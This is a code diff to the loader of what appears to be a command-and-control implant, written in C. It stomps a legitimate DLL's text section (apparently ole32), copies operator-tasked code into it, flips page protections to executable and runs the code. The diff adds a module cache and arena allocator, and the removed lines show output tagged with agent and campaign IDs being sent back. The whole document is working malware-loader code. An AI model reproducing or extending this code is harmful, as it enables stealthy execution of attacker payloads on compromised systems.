@@ -54,6 +54,16 @@ BOOL ModuleFreeLibrary(HMODULE mod) {
 }
 
 
+PVOID ModuleAllocate(DWORD Size) {
+	PVOID Addr = ldr->win32->LocalAlloc(LMEM_FIXED | LMEM_ZEROINIT, Size);
+	return Addr;
+}
+
+void ModuleFreeMemory(HLOCAL mem) {
+	ldr->win32->LocalFree(mem);
+}
+
+
 PVOID LdrGetText(PVOID Base, PSIZE_T textSize) {
 	PIMAGE_SECTION_HEADER sec = SECTION_HEADER(Base);
 	WORD numSections = FILE_HEADER(Base)->NumberOfSections;
@@ -109,6 +119,7 @@ BOOL LdrMapInOle() {
 	ldr->modules->TextSection = textAddr;
 	ldr->modules->TextSize = txtSize;
 	ldr->modules->oldPerms = PAGE_READONLY;
+	ldr->modules->ArenaCursor = (PBYTE)textAddr;
 
 	return TRUE;
 
@@ -116,62 +127,123 @@ BOOL LdrMapInOle() {
 }
 
 
-BOOL LdrRunModule(LdrTask info, BOOL CleanUpAfter) {
-	DBGA("[+] Mapping Module into memory\n");
+#define LDR_PAGE_ALIGN(x) (((SIZE_T)(x) + 0xFFF) & ~(SIZE_T)0xFFF)
 
-	if(!ldr->modules->TextSection) {
-		if(!LdrMapInOle())
+
+static DWORD LdrHashBytes(PBYTE data, SIZE_T len) {
+	DWORD h = 5381;
+	for (SIZE_T i = 0; i < len; i++)
+		h = (h * 33) + (DWORD)data[i];
+	return h;
+}
+
+
+static PVOID LdrArenaReserve(SIZE_T size) {
+	SIZE_T need = LDR_PAGE_ALIGN(size);
+	PBYTE  cur  = ldr->modules->ArenaCursor;
+	PBYTE  end  = (PBYTE)ldr->modules->TextSection + ldr->modules->TextSize;
+
+	if (!cur || need == 0 || cur + need > end)
+		return NULL;
+
+	ldr->modules->ArenaCursor = cur + need;
+	return cur;
+}
+
+static pLoadedModule LdrModuleFind(DWORD hash, PBYTE code, DWORD size) {
+	for (DWORD i = 0; i < MAX_LOADED_MODULES; i++) {
+		pLoadedModule m = &ldr->modules->Loaded[i];
+		if (m->Hash == hash && m->Size == size && LdrMemcmp(m->Entry, code, size) == 0)
+			return m;
+	}
+	return NULL;
+}
+
+static void LdrModuleInsert(DWORD hash, PVOID entry, DWORD size) {
+	if (hash == 0)
+		hash = 1;
+	for (DWORD i = 0; i < MAX_LOADED_MODULES; i++) {
+		pLoadedModule m = &ldr->modules->Loaded[i];
+		if (m->Hash == 0) {
+			m->Hash  = hash;
+			m->Entry = entry;
+			m->Size  = size;
+			return;
+		}
+	}
+	DBGA("[!] Module cache full, running uncached\n");
+}
+
+
+static void LdrBuildModuleApi(pModule api) {
+	api->size               = sizeof(Module);
+	api->Version            = 1;
+	api->ModuleWrite4       = ModuleWrite4;
+	api->ModuleWrite8       = ModuleWrite8;
+	api->ModuleWriteStr     = ModuleWriteStr;
+	api->ModuleGetModule    = ModuleGetModule;
+	api->ModuleGetProc      = ModuleGetProc;
+	api->ModuleLoadLibraryA = ModuleLoadLibraryA;
+	api->ModuleFreeLibrary  = ModuleFreeLibrary;
+	api->ModuleAllocate     = ModuleAllocate;
+	api->ModuleFree         = ModuleFreeMemory;
+}
+
+
+BOOL LdrRunModule(LdrTask info, ParserWrite *p) {
+	if (!ldr->modules->TextSection) {
+		DBGA("[+] Mapping Module into memory\n");
+		if (!LdrMapInOle())
 			return FALSE;
 	}
 
-	PVOID  txt = ldr->modules->TextSection;
-	SIZE_T tsz = ldr->modules->TextSize;
-	DWORD  old = 0;
+	DWORD hash = LdrHashBytes(info.Data, (SIZE_T)info.DataSize);
+	pLoadedModule cached = LdrModuleFind(hash, info.Data, info.DataSize);
+	PVOID entry = NULL;
 
-	if(!NT_SUCCESS(ldr->win32->NtProtectVirtualMemory(CurrentProcess(), &txt, &tsz, PAGE_READWRITE, &old))) {
-		DBGA("[*] NtProtect Failed\n");
-		return FALSE;
+	if (cached) {
+		DBGA("[*] Module cache hit\n");
+		entry = cached->Entry;
+	} else {
+		DBGA("[*] Module cache miss, loading\n");
+
+		PVOID dst = LdrArenaReserve((SIZE_T)info.DataSize);
+		if (!dst) {
+			DBGA("[!] Module arena exhausted\n");
+			return FALSE;
+		}
+
+		SIZE_T sz  = LDR_PAGE_ALIGN((SIZE_T)info.DataSize);
+		ULONG  old = 0;
+
+		if (!NT_SUCCESS(ldr->win32->NtProtectVirtualMemory(CurrentProcess(), &dst, &sz, PAGE_READWRITE, &old))) {
+			DBGA("[*] NtProtect Failed\n");
+			return FALSE;
+		}
+
+		LdrMemcpy(dst, info.Data, (SIZE_T)info.DataSize);
+		if (sz > (SIZE_T)info.DataSize)
+			LdrMemset((PBYTE)dst + info.DataSize, 0, sz - (SIZE_T)info.DataSize);
+
+		if (!NT_SUCCESS(ldr->win32->NtProtectVirtualMemory(CurrentProcess(), &dst, &sz, PAGE_EXECUTE_READ, &old))) {
+			DBGA("[*] NtProtect Failed\n");
+			return FALSE;
+		}
+		ldr->win32->NtFlushInstructionCache(CurrentProcess(), dst, (SIZE_T)info.DataSize);
+
+		entry = dst;
+		LdrModuleInsert(hash, entry, info.DataSize);
 	}
 
-	LdrMemcpy(txt, info.Data, (SIZE_T)info.DataSize);
-	if ((SIZE_T)info.DataSize < tsz) {
-		LdrMemset((PBYTE)txt + info.DataSize, 0, tsz - (SIZE_T)info.DataSize);
-	}
+	
+	if (info.Data)
+		ldr->win32->LocalFree(info.Data);
 
-	if(!NT_SUCCESS(ldr->win32->NtProtectVirtualMemory(CurrentProcess(), &txt, &tsz, PAGE_EXECUTE_READ, &old))) {
-		DBGA("[*] NtProtect Failed\n");
-		return FALSE;
-	}
-	ldr->win32->NtFlushInstructionCache(CurrentProcess(), txt, (SIZE_T)info.DataSize);
+	Module api;
+	LdrBuildModuleApi(&api);
 
-	pModule mod = ldr->win32->LocalAlloc(LMEM_FIXED | LMEM_ZEROINIT, sizeof(Module));
-	if (!mod)
-		return FALSE;
-
-	mod->size              = sizeof(Module);
-	mod->Version           = 1;
-	mod->ModuleWrite4      = ModuleWrite4;
-	mod->ModuleWrite8      = ModuleWrite8;
-	mod->ModuleWriteStr    = ModuleWriteStr;
-	mod->ModuleGetModule   = ModuleGetModule;
-	mod->ModuleGetProc     = ModuleGetProc;
-	mod->ModuleLoadLibraryA = ModuleLoadLibraryA;
-	mod->ModuleFreeLibrary = ModuleFreeLibrary;
-
-	ParserWrite *p = ParserInitWrite();
-	if (!p) {
-		ldr->win32->LocalFree(mod);
-		return FALSE;
-	}
-
-	ParserWrite4(p, MSG_OUTPUT);
-	ParserWriteBytes(p, (PBYTE)ldr->config->AgentId, LdrStrlen(ldr->config->AgentId));
-	ParserWriteBytes(p, (PBYTE)ldr->config->CampaignID, LdrStrlen(ldr->config->CampaignID));
-	ParserWrite4(p, info.Id);
-
-	pModuleEntry entry = (pModuleEntry)txt;
 	DBGA("[*] Running Module\n");
-	if (!entry(mod, (PVOID)p, (PBYTE)info.args, 0)) {
+	if (!((pModuleEntry)entry)(&api, (PVOID)p, (PBYTE)info.args, 0)) {
 		DBGA("[!] Module returned failure\n");
 	}
 	DBGA("[*] Module ran succesfully");
@@ -179,11 +251,6 @@ BOOL LdrRunModule(LdrTask info, BOOL CleanUpAfter) {
 	if(info.args) {
 		ldr->win32->LocalFree(info.args);
 	}
-
-	NwPostOutput(ParserWriteReturnPointer(p), ParserWriteReturnSize(p));
-	ParserClearWrite(p);
-	ldr->win32->LocalFree(mod);
-
 
 	return TRUE;
 }
